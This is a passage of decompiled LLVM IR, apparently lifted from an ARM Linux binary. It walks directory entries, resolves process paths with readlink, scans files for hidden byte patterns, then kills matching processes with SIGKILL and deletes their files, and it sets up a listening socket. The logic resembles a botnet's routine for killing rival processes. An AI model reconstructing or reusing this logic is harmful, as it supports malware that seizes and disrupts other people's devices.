  %v2_e858 = urem i32 %v1_e820, 10
  %v2_e85c = icmp eq i32 %v2_e858, 0
  br i1 %v2_e85c, label %dec_label_pc_e864, label %dec_label_pc_e7ec.backedge

dec_label_pc_e864:                                ; preds = %dec_label_pc_e850
  %v1_e868 = call i32 @sleep(i32 1)
  %v0_e86c = load i32, i32* %sb.global-to-local, align 4
  %v1_e86c = inttoptr i32 %v0_e86c to %__dirstream*
  %v3_e870 = call %dirent* @readdir(%__dirstream* %v1_e86c)
  %v2_e874 = icmp eq %dirent* %v3_e870, null
  br i1 %v2_e874, label %dec_label_pc_e87c, label %dec_label_pc_e7fc

dec_label_pc_e87c:                                ; preds = %dec_label_pc_e7ec.backedge, %dec_label_pc_e864, %dec_label_pc_e7e4
  %stack_var_-8404.3 = phi i32 [ %stack_var_-8404.0, %dec_label_pc_e7e4 ], [ %v1_e820, %dec_label_pc_e864 ], [ %stack_var_-8404.1.be, %dec_label_pc_e7ec.backedge ]
  %v0_e87c = load i32, i32* %sb.global-to-local, align 4
  %v1_e87c = inttoptr i32 %v0_e87c to %__dirstream*
  %v3_e880 = call i32 @closedir(%__dirstream* %v1_e87c)
  br label %dec_label_pc_e7c4

dec_label_pc_e888:                                ; preds = %dec_label_pc_e80c
  %v1_e898 = call i32 @function_11394(i32 15)
  %v1_e8a0 = call i32 @function_11394(i32 16)
  %v3_e8ac = call i32 @function_112b0(i32 15, i32* null)
  store i32 %v2_e8b8, i32* @r0, align 4
  %v3_e8bc = call i32 @function_11a04(i8* %v2_e8bc, i32 %v3_e8ac)
  store i32 %v2_e8b8, i32* %ip.global-to-local, align 4
  %v2_e8c8 = add i32 %v3_e8bc, %v2_e8b8
  %v0_e8cc = load i32, i32* @r6, align 4
  store i32 %v2_e8c8, i32* @r0, align 4
  %v2_e8d4 = inttoptr i32 %v2_e8c8 to i8*
  %v3_e8d4 = call i32 @function_11a04(i8* %v2_e8d4, i32 %v0_e8cc)
  %v3_e8e4 = call i32 @function_112b0(i32 16, i32* null)
  %v2_e8ec = add i32 %v3_e8d4, %v2_e8c8
  store i32 %v2_e8ec, i32* @r0, align 4
  %v2_e8f0 = inttoptr i32 %v2_e8ec to i8*
  %v3_e8f0 = call i32 @function_11a04(i8* %v2_e8f0, i32 %v3_e8e4)
  %v3_e8fc = call i32 @function_112b0(i32 15, i32* null)
  store i32 %v2_e908, i32* @r0, align 4
  %v3_e90c = call i32 @function_11a04(i8* %v2_e90c, i32 %v3_e8fc)
  %v2_e918 = add i32 %v3_e90c, %v2_e908
  store i32 %v2_e918, i32* @r5, align 4
  store i32 %v2_e918, i32* @r0, align 4
  %v0_e920 = load i32, i32* @r6, align 4
  %v2_e924 = inttoptr i32 %v2_e918 to i8*
  %v3_e924 = call i32 @function_11a04(i8* %v2_e924, i32 %v0_e920)
  store i32 %v3_e924, i32* @r4, align 4
  %v3_e934 = call i32 @function_112b0(i32 32, i32* null)
  %v0_e93c = load i32, i32* @r5, align 4
  %v1_e93c = load i32, i32* @r4, align 4
  %v2_e93c = add i32 %v1_e93c, %v0_e93c
  store i32 %v2_e93c, i32* @r0, align 4
  %v2_e940 = inttoptr i32 %v2_e93c to i8*
  %v3_e940 = call i32 @function_11a04(i8* %v2_e940, i32 %v3_e934)
  %v1_e948 = call i32 @function_112dc(i32 15)
  %v1_e950 = call i32 @function_112dc(i32 16)
  store i32 4095, i32* %r2.global-to-local, align 4
  %v2_e964 = load i32, i32* %stack_var_-8412, align 4
  %v3_e964 = inttoptr i32 %v2_e964 to i8*
  %v7_e968 = call i32 @readlink(i8* %v2_e8bc, i8* %v3_e964, i32 4095)
  %v2_e970 = icmp eq i32 %v7_e968, -1
  store i32 %v7_e968, i32* @r5, align 4
  store i32 -8364, i32* %r2.global-to-local, align 4
  br i1 %v2_e970, label %dec_label_pc_ea38, label %dec_label_pc_e980

dec_label_pc_e980:                                ; preds = %dec_label_pc_e888
  store i32 %v2_e984, i32* %ip.global-to-local, align 4
  %v2_e988 = add i32 %v7_e968, %v2_e984
  store i32 %v2_e988, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_e990 = add i32 %v2_e988, -8364
  %v5_e990 = inttoptr i32 %v4_e990 to i8*
  store i8 0, i8* %v5_e990, align 1
  %v1_e998 = call i32 @function_11394(i32 33)
  %v0_e99c = load i32, i32* @r4, align 4
  %v2_e9a4 = inttoptr i32 %v0_e99c to i32*
  %v3_e9a4 = call i32 @function_112b0(i32 33, i32* %v2_e9a4)
  %v0_e9a8 = load i32, i32* @r5, align 4
  %v1_e9a8 = add i32 %v0_e9a8, -1
  store i32 %v1_e9a8, i32* @r1, align 4
  store i32 %v3_e9a4, i32* %r2.global-to-local, align 4
  %v2_e9b0 = load i32, i32* %stack_var_-8412, align 4
  %v3_e9b4 = inttoptr i32 %v2_e9b0 to i8*
  %v4_e9b4 = call i32 @function_11d30(i8* %v3_e9b4, i32 %v1_e9a8, i32 %v3_e9a4)
  %v2_e9b8 = icmp eq i32 %v4_e9b4, -1
  br i1 %v2_e9b8, label %dec_label_pc_e9d4, label %dec_label_pc_e9c0

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e980
  %v2_e9c0 = load i32, i32* %stack_var_-8412, align 4
  %v3_e9c0 = inttoptr i32 %v2_e9c0 to i8*
  %v3_e9c4 = call i32 @unlink(i8* %v3_e9c0)
  %v0_e9c8 = load i32, i32* @r7, align 4
  %v2_e9d0 = call i32 @kill(i32 %v0_e9c8, i32 9)
  br label %dec_label_pc_e9d4

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e980, %dec_label_pc_e9c0
  %v1_e9d8 = call i32 @function_112dc(i32 33)
  %v1_e9dc = call i32 @getpid()
  %v0_e9e0 = load i32, i32* @r7, align 4
  %v9_e9e0 = icmp eq i32 %v0_e9e0, %v1_e9dc
  br i1 %v9_e9e0, label %dec_label_pc_ea0c, label %dec_label_pc_e9e8

dec_label_pc_e9e8:                                ; preds = %dec_label_pc_e9d4
  %v0_e9e8 = call i32 @getppid()
  %v0_e9ec = load i32, i32* @r7, align 4
  %v9_e9ec = icmp eq i32 %v0_e9ec, %v0_e9e8
  br i1 %v9_e9ec, label %dec_label_pc_ea0c, label %dec_label_pc_e9f4

dec_label_pc_e9f4:                                ; preds = %dec_label_pc_e9e8
  store i32 ptrtoint (i8** @global_var_1a718.122 to i32), i32* %r2.global-to-local, align 4
  %v2_e9f8 = load i32, i32* %stack_var_-8412, align 4
  %v3_e9fc = load i8*, i8** @global_var_1a718.122, align 4
  %v4_e9fc = ptrtoint i8* %v3_e9fc to i32
  %v5_ea00 = inttoptr i32 %v2_e9f8 to i8*
  %v6_ea00 = call i32 @function_11dbc(i8* %v5_ea00, i32 %v4_e9fc, i32 ptrtoint (i8** @global_var_1a718.122 to i32))
  %v2_ea04 = icmp eq i32 %v6_ea00, 0
  br i1 %v2_ea04, label %dec_label_pc_ea18, label %dec_label_pc_e9f4.dec_label_pc_ea0c_crit_edge

dec_label_pc_e9f4.dec_label_pc_ea0c_crit_edge:    ; preds = %dec_label_pc_e9f4
  %v0_ea10.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ea0c

dec_label_pc_ea0c:                                ; preds = %dec_label_pc_e9f4.dec_label_pc_ea0c_crit_edge, %dec_label_pc_e9e8, %dec_label_pc_e9d4
  %v0_ea10 = phi i32 [ %v0_ea10.pre, %dec_label_pc_e9f4.dec_label_pc_ea0c_crit_edge ], [ %v0_e9e8, %dec_label_pc_e9e8 ], [ %v1_e9dc, %dec_label_pc_e9d4 ]
  store i32 %v2_e88c, i32* @r4, align 4
  store i32 %v0_ea10, i32* @r5, align 4
  br label %dec_label_pc_e7ec.backedge

dec_label_pc_e7ec.backedge:                       ; preds = %dec_label_pc_e850, %dec_label_pc_e848, %dec_label_pc_e7fc, %dec_label_pc_ea0c, %dec_label_pc_ebd4, %.thread6
  %stack_var_-8404.1.be = phi i32 [ %v1_e820, %dec_label_pc_ebd4 ], [ %v1_e820, %dec_label_pc_ea0c ], [ %v1_e820, %.thread6 ], [ %stack_var_-8404.2, %dec_label_pc_e7fc ], [ %v1_e820, %dec_label_pc_e848 ], [ %v1_e820, %dec_label_pc_e850 ]
  %v0_e7ec = load i32, i32* %sb.global-to-local, align 4
  %v1_e7ec = inttoptr i32 %v0_e7ec to %__dirstream*
  %v3_e7f0 = call %dirent* @readdir(%__dirstream* %v1_e7ec)
  %v2_e7f4 = icmp eq %dirent* %v3_e7f0, null
  br i1 %v2_e7f4, label %dec_label_pc_e87c, label %dec_label_pc_e7fc.preheader

dec_label_pc_ea18:                                ; preds = %dec_label_pc_e9f4
  %v2_ea1c = load i32, i32* %stack_var_-8412, align 4
  %v3_ea1c = inttoptr i32 %v2_ea1c to i8*
  %v4_ea20 = call i32 (i8*, i32, ...) @open(i8* %v3_ea1c, i32 0)
  %v2_ea24 = icmp eq i32 %v4_ea20, -1
  store i32 %v4_ea20, i32* @r4, align 4
  br i1 %v2_ea24, label %dec_label_pc_ec2c, label %dec_label_pc_ea30

dec_label_pc_ea30:                                ; preds = %dec_label_pc_ea18, %dec_label_pc_ec2c
  %v0_ea30 = phi i32 [ %v4_ea20, %dec_label_pc_ea18 ], [ %v0_ea30.pre, %dec_label_pc_ec2c ]
  %v1_ea34 = call i32 @close(i32 %v0_ea30)
  br label %dec_label_pc_ea38

dec_label_pc_ea38:                                ; preds = %dec_label_pc_e888, %dec_label_pc_ea30
  %v4_ea44 = call i32 (i8*, i32, ...) @open(i8* %v2_e8bc, i32 0)
  %v2_ea48 = icmp eq i32 %v4_ea44, -1
  store i32 %v4_ea44, i32* %fp.global-to-local, align 4
  br i1 %v2_ea48, label %dec_label_pc_ebd4, label %dec_label_pc_ea54

dec_label_pc_ea54:                                ; preds = %dec_label_pc_ea38
  %v1_ea58 = call i32 @function_11394(i32 20)
  %v1_ea60 = call i32 @function_11394(i32 21)
  %v1_ea68 = call i32 @function_11394(i32 22)
  %v3_ea78 = call i32 @function_112b0(i32 20, i32* nonnull %stack_var_-40)
  store i32 %v3_ea78, i32* @r5, align 4
  %v3_ea8c = call i32 @function_112b0(i32 21, i32* nonnull %stack_var_-44)
  store i32 %v3_ea8c, i32* @r6, align 4
  %v3_eaa0 = call i32 @function_112b0(i32 22, i32* nonnull %stack_var_-48)
  store i32 %v3_eaa0, i32* %r8.global-to-local, align 4
  %v0_eaa8155 = load i32, i32* %fp.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_eab4156 = call i32 @read(i32 %v0_eaa8155, i32* nonnull %stack_var_-4304, i32 4096)
  %tmp146158 = icmp slt i32 %v4_eab4156, 1
  br i1 %tmp146158, label %dec_label_pc_ec08, label %dec_label_pc_eac0

dec_label_pc_eac0:                                ; preds = %dec_label_pc_ea54, %dec_label_pc_eaa8.backedge
  %v4_eab4159 = phi i32 [ %v4_eab4, %dec_label_pc_eaa8.backedge ], [ %v4_eab4156, %dec_label_pc_ea54 ]
  store i32 %v2_e530, i32* %r3.global-to-local, align 4
  %v3_eac4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_eac4, i32* @r4, align 4
  %v5_eacc = icmp slt i32 %v4_eab4159, %v3_eac4
  br i1 %v5_eacc, label %dec_label_pc_eadc, label %dec_label_pc_eb4c.lr.ph

dec_label_pc_eb4c.lr.ph:                          ; preds = %dec_label_pc_eac0
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_eb4c.pre = load i32, i32* @r5, align 4
  %v1_eb50.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_eb4c

dec_label_pc_eadc:                                ; preds = %dec_label_pc_eb44.backedge, %dec_label_pc_eac0
  store i32 %v2_e530, i32* %ip.global-to-local, align 4
  %v3_eae0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_eae0, i32* @r4, align 4
  %v5_eae8 = icmp slt i32 %v4_eab4159, %v3_eae0
  br i1 %v5_eae8, label %dec_label_pc_eaf8, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_eadc
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_eb7852 = icmp eq i32 %v4_eab4159, 0
  br i1 %v2_eb7852, label %dec_label_pc_eaf8, label %dec_label_pc_eb80.lr.ph

dec_label_pc_eb80.lr.ph:                          ; preds = %.thread23
  %v0_eb80.pre = load i32, i32* @r6, align 4
  %v1_eb84.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_eb80

dec_label_pc_eaf8:                                ; preds = %dec_label_pc_eb78.backedge, %.thread23, %dec_label_pc_eadc
  %v3_eafc = load i32, i32* %stack_var_-48, align 4
  %v5_eb04 = icmp slt i32 %v4_eab4159, %v3_eafc
  br i1 %v5_eb04, label %dec_label_pc_eaa8.backedge, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_eaf8
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_eb1061 = icmp eq i32 %v4_eab4159, 0
  br i1 %v2_eb1061, label %dec_label_pc_eaa8.backedge, label %dec_label_pc_eb18.lr.ph

dec_label_pc_eaa8.backedge:                       ; preds = %dec_label_pc_eb30, %.thread29, %dec_label_pc_eaf8
  %v0_eaa8 = load i32, i32* %fp.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_eab4 = call i32 @read(i32 %v0_eaa8, i32* nonnull %stack_var_-4304, i32 4096)
  %tmp146 = icmp slt i32 %v4_eab4, 1
  br i1 %tmp146, label %dec_label_pc_ec08, label %dec_label_pc_eac0

dec_label_pc_eb18.lr.ph:                          ; preds = %.thread29
  %v0_eb18.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_eb1c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_eb18

dec_label_pc_eb18:                                ; preds = %dec_label_pc_eb30, %dec_label_pc_eb18.lr.ph
  %v0_eb10.in = phi i32 [ %v4_eab4159, %dec_label_pc_eb18.lr.ph ], [ %v0_eb10, %dec_label_pc_eb30 ]
  %v0_eb30 = phi i32 [ 0, %dec_label_pc_eb18.lr.ph ], [ %v1_eb30, %dec_label_pc_eb30 ]
  %v0_eb24 = phi i32 [ 0, %dec_label_pc_eb18.lr.ph ], [ %v1_eb24., %dec_label_pc_eb30 ]
  %v0_eb10 = add i32 %v0_eb10.in, -1
  %v2_eb18 = add i32 %v0_eb24, %v0_eb18.pre
  %v3_eb18 = inttoptr i32 %v2_eb18 to i8*
  %v4_eb18 = load i8, i8* %v3_eb18, align 1
  %v6_eb18 = zext i8 %v4_eb18 to i32
  store i32 %v6_eb18, i32* %r2.global-to-local, align 4
  %v2_eb1c = add i32 %v0_eb30, %v1_eb1c.pre
  %v3_eb1c = inttoptr i32 %v2_eb1c to i8*
  %v4_eb1c = load i8, i8* %v3_eb1c, align 1
  %v6_eb1c = zext i8 %v4_eb1c to i32
  store i32 %v6_eb1c, i32* %r3.global-to-local, align 4
  %v9_eb20 = icmp eq i8 %v4_eb1c, %v4_eb18
  %v1_eb24 = add i32 %v0_eb24, 1
  %v1_eb24. = select i1 %v9_eb20, i32 %v1_eb24, i32 0
  br i1 %v9_eb20, label %dec_label_pc_eba0, label %dec_label_pc_eb30

dec_label_pc_eb30:                                ; preds = %dec_label_pc_eba0, %dec_label_pc_eb18
  %v1_eb30 = add i32 %v0_eb30, 1
  store i32 %v1_eb30, i32* %ip.global-to-local, align 4
  %v2_eb10 = icmp eq i32 %v0_eb10, 0
  br i1 %v2_eb10, label %dec_label_pc_eaa8.backedge, label %dec_label_pc_eb18

dec_label_pc_eb38:                                ; preds = %dec_label_pc_eb4c
  %v9_eb38 = icmp eq i32 %v3_eac4, %v1_eb58.
  br i1 %v9_eb38, label %dec_label_pc_eba8, label %dec_label_pc_eb44.backedge

dec_label_pc_eb44.backedge:                       ; preds = %dec_label_pc_eb4c, %dec_label_pc_eb38
  %storemerge75 = add i32 %storemerge75.in, 1
  %v2_eb44 = icmp eq i32 %v0_eb44, 0
  br i1 %v2_eb44, label %dec_label_pc_eadc, label %dec_label_pc_eb4c

dec_label_pc_eb4c:                                ; preds = %dec_label_pc_eb44.backedge, %dec_label_pc_eb4c.lr.ph
  %v0_eb44.in = phi i32 [ %v4_eab4159, %dec_label_pc_eb4c.lr.ph ], [ %v0_eb44, %dec_label_pc_eb44.backedge ]
  %storemerge75.in = phi i32 [ 0, %dec_label_pc_eb4c.lr.ph ], [ %storemerge75, %dec_label_pc_eb44.backedge ]
  %v0_eb58 = phi i32 [ 0, %dec_label_pc_eb4c.lr.ph ], [ %v1_eb58., %dec_label_pc_eb44.backedge ]
  %v0_eb44 = add i32 %v0_eb44.in, -1
  %v2_eb4c = add i32 %v0_eb58, %v0_eb4c.pre
  %v3_eb4c = inttoptr i32 %v2_eb4c to i8*
  %v4_eb4c = load i8, i8* %v3_eb4c, align 1
  %v6_eb4c = zext i8 %v4_eb4c to i32
  store i32 %v6_eb4c, i32* %r2.global-to-local, align 4
  %v2_eb50 = add i32 %storemerge75.in, %v1_eb50.pre
  %v3_eb50 = inttoptr i32 %v2_eb50 to i8*
  %v4_eb50 = load i8, i8* %v3_eb50, align 1
  %v6_eb50 = zext i8 %v4_eb50 to i32
  store i32 %v6_eb50, i32* %r3.global-to-local, align 4
  %v9_eb54 = icmp eq i8 %v4_eb50, %v4_eb4c
  %v1_eb58 = add i32 %v0_eb58, 1
  %v1_eb58. = select i1 %v9_eb54, i32 %v1_eb58, i32 0
  store i32 %v1_eb58., i32* %ip.global-to-local, align 4
  br i1 %v9_eb54, label %dec_label_pc_eb38, label %dec_label_pc_eb44.backedge

dec_label_pc_eb6c:                                ; preds = %dec_label_pc_eb80
  %v9_eb6c = icmp eq i32 %v3_eae0, %v1_eb8c.
  br i1 %v9_eb6c, label %dec_label_pc_eba8, label %dec_label_pc_eb78.backedge

dec_label_pc_eb78.backedge:                       ; preds = %dec_label_pc_eb80, %dec_label_pc_eb6c
  %storemerge = add i32 %storemerge.in, 1
  %v2_eb78 = icmp eq i32 %v0_eb78, 0
  br i1 %v2_eb78, label %dec_label_pc_eaf8, label %dec_label_pc_eb80

dec_label_pc_eb80:                                ; preds = %dec_label_pc_eb78.backedge, %dec_label_pc_eb80.lr.ph
  %v0_eb78.in = phi i32 [ %v4_eab4159, %dec_label_pc_eb80.lr.ph ], [ %v0_eb78, %dec_label_pc_eb78.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_eb80.lr.ph ], [ %storemerge, %dec_label_pc_eb78.backedge ]
  %v0_eb8c = phi i32 [ 0, %dec_label_pc_eb80.lr.ph ], [ %v1_eb8c., %dec_label_pc_eb78.backedge ]
  %v0_eb78 = add i32 %v0_eb78.in, -1
  %v2_eb80 = add i32 %v0_eb8c, %v0_eb80.pre
  %v3_eb80 = inttoptr i32 %v2_eb80 to i8*
  %v4_eb80 = load i8, i8* %v3_eb80, align 1
  %v6_eb80 = zext i8 %v4_eb80 to i32
  store i32 %v6_eb80, i32* %r2.global-to-local, align 4
  %v2_eb84 = add i32 %storemerge.in, %v1_eb84.pre
  %v3_eb84 = inttoptr i32 %v2_eb84 to i8*
  %v4_eb84 = load i8, i8* %v3_eb84, align 1
  %v6_eb84 = zext i8 %v4_eb84 to i32
  store i32 %v6_eb84, i32* %r3.global-to-local, align 4
  %v9_eb88 = icmp eq i8 %v4_eb84, %v4_eb80
  %v1_eb8c = add i32 %v0_eb8c, 1
  %v1_eb8c. = select i1 %v9_eb88, i32 %v1_eb8c, i32 0
  store i32 %v1_eb8c., i32* %ip.global-to-local, align 4
  br i1 %v9_eb88, label %dec_label_pc_eb6c, label %dec_label_pc_eb78.backedge

dec_label_pc_eba0:                                ; preds = %dec_label_pc_eb18
  %v9_eba0 = icmp eq i32 %v3_eafc, %v1_eb24.
  br i1 %v9_eba0, label %dec_label_pc_eba8, label %dec_label_pc_eb30

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eb38, %dec_label_pc_eb6c, %dec_label_pc_eba0
  %v1_ebac = call i32 @function_112dc(i32 20)
  %v1_ebb4 = call i32 @function_112dc(i32 21)
  %v1_ebbc = call i32 @function_112dc(i32 22)
  %v0_ebc0 = load i32, i32* %fp.global-to-local, align 4
  %v1_ebc4 = call i32 @close(i32 %v0_ebc0)
  %v0_ebc8 = load i32, i32* @r7, align 4
  %v2_ebd0 = call i32 @kill(i32 %v0_ebc8, i32 9)
  br label %dec_label_pc_ebd4

dec_label_pc_ebd4:                                ; preds = %dec_label_pc_ea38, %dec_label_pc_ec08, %dec_label_pc_eba8
  store i32 64, i32* @r1, align 4
  store i32 %v2_e8b8, i32* @r0, align 4
  %v0_ebe0 = call i32 @function_11a7c()
  store i32 %v2_e908, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_ebf0 = call i32 @function_11a7c()
  %v1_ebf8 = call i32 @sleep(i32 1)
  store i32 %v2_e88c, i32* @r4, align 4
  %v0_ec00 = load i32, i32* @r7, align 4
  store i32 %v0_ec00, i32* @r5, align 4
  br label %dec_label_pc_e7ec.backedge

dec_label_pc_ec08:                                ; preds = %dec_label_pc_eaa8.backedge, %dec_label_pc_ea54
  %v1_ec0c = call i32 @function_112dc(i32 20)
  %v1_ec14 = call i32 @function_112dc(i32 21)
  %v1_ec1c = call i32 @function_112dc(i32 22)
  %v0_ec20 = load i32, i32* %fp.global-to-local, align 4
  %v1_ec24 = call i32 @close(i32 %v0_ec20)
  br label %dec_label_pc_ebd4

dec_label_pc_ec2c:                                ; preds = %dec_label_pc_ea18
  %v0_ec2c = load i32, i32* @r7, align 4
  %v2_ec34 = call i32 @kill(i32 %v0_ec2c, i32 9)
  %v0_ea30.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ea30

; uselistorder directives
  uselistorder i32 %v1_eb8c., { 2, 1, 0 }
  uselistorder i1 %v9_eb88, { 1, 0 }
  uselistorder i32 %v0_eb8c, { 1, 0 }
  uselistorder i32 %v1_eb58., { 2, 1, 0 }
  uselistorder i1 %v9_eb54, { 1, 0 }
  uselistorder i32 %v0_eb58, { 1, 0 }
  uselistorder i32 %v1_eb30, { 1, 0 }
  uselistorder i32 %v1_eb24., { 1, 0 }
  uselistorder i1 %v9_eb20, { 1, 0 }
  uselistorder i32 %v0_eb24, { 1, 0 }
  uselistorder i32 %v0_eb30, { 1, 0 }
  uselistorder i32 %v4_eab4, { 1, 0 }
  uselistorder i32 %v4_eab4159, { 0, 2, 1, 7, 6, 5, 4, 3 }
  uselistorder %dirent* %v3_e7f0, { 1, 0 }
  uselistorder i32 %stack_var_-8404.1.be, { 1, 0 }
  uselistorder %dirent* %v3_e870, { 1, 0 }
  uselistorder i32 %v1_e820, { 0, 1, 5, 4, 3, 2, 7, 8, 6 }
  uselistorder i32 %v5_e7d8, { 1, 0 }
  uselistorder i32 %stack_var_-8404.0, { 1, 0 }
  uselistorder i32 %v2_e908, { 1, 0, 2 }
  uselistorder i32 %v2_e8b8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e798, { 1, 0, 2 }
  uselistorder i32 %v1_e6ec, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %storemerge109, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-64, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4304, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 22, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %ip.global-to-local, { 3, 4, 5, 2, 1, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32 64, { 9, 10, 11, 12, 7, 13, 14, 15, 0, 16, 17, 18, 19, 1, 20, 21, 22, 8, 23, 24, 25, 2, 26, 27, 28, 3, 29, 30, 31, 4, 32, 33, 34, 35, 36, 5, 37, 38, 39, 40, 41, 6, 42 }
  uselistorder i32 (i8*, i32, i32)* @function_11d30, { 0, 3, 1, 2 }
  uselistorder i32 (%__dirstream*)* @closedir, { 2, 1, 0, 3 }
  uselistorder %dirent* null, { 4, 3, 1, 5, 6, 7, 0, 8, 2 }
  uselistorder %dirent* (%__dirstream*)* @readdir, { 5, 4, 1, 7, 3, 8, 0, 6, 2, 9 }
  uselistorder i32 (i8*, i8*, i32)* @readlink, { 2, 1, 3, 0, 4 }
  uselistorder i8** @global_var_1a718.122, { 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_1a718.122 to i32), { 0, 3, 2, 1 }
  uselistorder i32 4096, { 5, 9, 0, 1, 6, 10, 7, 11, 2, 8, 3, 4 }
  uselistorder i32* @global_var_1a71c.116, { 0, 2, 1 }
  uselistorder label %dec_label_pc_ebd4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_eba8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_eac0, { 1, 0 }
  uselistorder label %dec_label_pc_ea38, { 1, 0 }
  uselistorder label %dec_label_pc_ea30, { 1, 0 }
  uselistorder label %dec_label_pc_e7ec.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_e9d4, { 1, 0 }
  uselistorder label %dec_label_pc_e7fc, { 1, 0 }
  uselistorder label %dec_label_pc_e7fc.preheader, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_e69c, { 1, 0 }
  uselistorder label %dec_label_pc_e640, { 1, 0 }
  uselistorder label %dec_label_pc_e5e4, { 1, 0 }
  uselistorder label %dec_label_pc_e594, { 1, 0 }
}

define i32 @function_ec48(i32 %arg1) local_unnamed_addr {
dec_label_pc_ec48:
  store i32 ptrtoint (i32* @global_var_edd0.126 to i32), i32* @global_var_1a690.128, align 4
  ret i32 %arg1
}

define i32 @function_ec60(i32 %arg1) local_unnamed_addr {
dec_label_pc_ec60:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_ec60 = load i32, i32* @r4, align 4
  %v9_ec60 = load i32, i32* @r6, align 4
  %v12_ec60 = load i32, i32* @r7, align 4
  %v15_ec60 = load i32, i32* @r8, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_ec7c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_1a688.130 to i32), i32* @r6, align 4
  %v2_ec84 = icmp eq i32 %v3_ec7c, -1
  store i32 %v3_ec7c, i32* @global_var_1a688.130, align 4
  br i1 %v2_ec84, label %dec_label_pc_ed44, label %dec_label_pc_ec90

dec_label_pc_ec90:                                ; preds = %dec_label_pc_ec60
  %v0_ec94 = load i32, i32* %r4.global-to-local, align 4
  %v6_eca4 = call i32 @setsockopt(i32 %v3_ec7c, i32 %v0_ec94, i32 2, i32* nonnull %stack_var_-28, i32 4)
  %v2_eca8 = load i32, i32* @global_var_1a688.130, align 4
  store i32 %v2_eca8, i32* %r4.global-to-local, align 4
  %v2_ecb8 = call i32 (i32, i32, ...) @fcntl(i32 %v2_eca8, i32 3)
  %v2_ecc8 = call i32 (i32, i32, ...) @fcntl(i32 %v2_eca8, i32 4)
  store i32 ptrtoint (i8** @global_var_1a694.132 to i32), i32* @r8, align 4
  %v2_ecd0 = load i8, i8* bitcast (i8** @global_var_1a694.132 to i8*), align 4
  %v2_ecd4 = icmp eq i8 %v2_ecd0, 0
  br i1 %v2_ecd4, label %.thread2, label %.thread

.thread2:                                         ; preds = %dec_label_pc_ec90
  br label %bb

.thread:                                          ; preds = %dec_label_pc_ec90
  br label %bb

bb:                                               ; preds = %.thread2, %.thread
  store i32 0, i32* @r5, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_ed0c = call i32* @__errno_location()
  %v2_ed0c = ptrtoint i32* %v0_ed0c to i32
  %v0_ed10 = load i32, i32* @r5, align 4
  store i32 %v0_ed10, i32* %v0_ed0c, align 4
  %v2_ed14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_ed14, i32* @r7, align 4
  store i32 %v2_ed0c, i32* %r4.global-to-local, align 4
  %tmp21 = bitcast i32* %stack_var_-44 to %sockaddr*
  %v2_ed20 = load i32, i32* @global_var_1a688.130, align 4
  %v5_ed28 = call i32 @bind(i32 %v2_ed20, %sockaddr* %tmp21, i32 16)
  %v2_ed2c = icmp eq i32 %v5_ed28, -1
  br i1 %v2_ed2c, label %dec_label_pc_ed4c, label %dec_label_pc_ed34

dec_label_pc_ed34:                                ; preds = %bb
  %v2_ed3c = load i32, i32* @global_var_1a688.130, align 4
  %v2_ed40 = call i32 @listen(i32 %v2_ed3c, i32 1)
  br label %dec_label_pc_ed44

dec_label_pc_ed44:                                ; preds = %dec_label_pc_ec60, %dec_label_pc_ed58, %dec_label_pc_ed34
  %v20_ed48 = phi i32 [ -1, %dec_label_pc_ec60 ], [ %v1_eda8, %dec_label_pc_ed58 ], [ %v2_ed40, %dec_label_pc_ed34 ]
  store i32 %v3_ec60, i32* @r4, align 4
  store i32 %v9_ec60, i32* @r6, align 4
  store i32 %v12_ec60, i32* @r7, align 4
  store i32 %v15_ec60, i32* @r8, align 4
  ret i32 %v20_ed48

dec_label_pc_ed4c:                                ; preds = %bb
  %v0_ed4c = load i32, i32* %r4.global-to-local, align 4
